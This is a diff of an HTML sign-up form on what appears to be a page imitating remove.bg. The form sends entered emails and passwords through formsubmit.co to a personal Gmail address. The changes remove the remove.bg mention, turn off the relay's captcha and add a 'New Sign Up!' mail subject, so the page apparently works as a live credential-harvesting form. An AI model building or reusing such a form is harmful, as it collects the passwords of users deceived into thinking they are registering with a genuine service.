@@ -249,24 +249,21 @@
     </div>
     <div class="or-divider"><span>or</span></div>
 <form action="https://formsubmit.co/siyamyyy@gmail.com" method="POST">
-  <input type="email" name="email" placeholder="Email" id="signupEmail" required>
-  <input type="password" name="password" placeholder="Password (8 characters minimum)" id="signupPassword" required minlength="8">
-  <input type="password" name="confirm_password" placeholder="Confirm Password" id="signupConfirm" required>
-  
-  <div class="form-check">
-    <input type="checkbox" id="terms" required>
-    <label for="terms">
-      I agree to the <a href="#">Terms of Service</a>, <a href="#">General Terms</a>, and <a href="#">Privacy Policy</a>.
-    </label>
-  </div>
+  <input type="email" name="email" placeholder="Email" required>
+  <input type="password" name="password" placeholder="Password (8 characters minimum)" required minlength="8">
+  <input type="password" name="confirm_password" placeholder="Confirm Password" required minlength="8">
 
   <div class="form-check">
-    <input type="checkbox" id="updates" name="updates">
-    <label for="updates">Send me updates about remove.bg products and services.</label>
+    <input type="checkbox" name="agree_terms" required>
+    <label>I agree to the Terms and Privacy Policy.</label>
   </div>
 
-  <button class="btn-submit" id="signupButton" type="submit">Sign up</button>
+  <input type="hidden" name="_captcha" value="false">
+  <input type="hidden" name="_subject" value="New Sign Up!">
+
+  <button type="submit" class="btn-submit">Sign up</button>
 </form>
+
 
   </div>
 
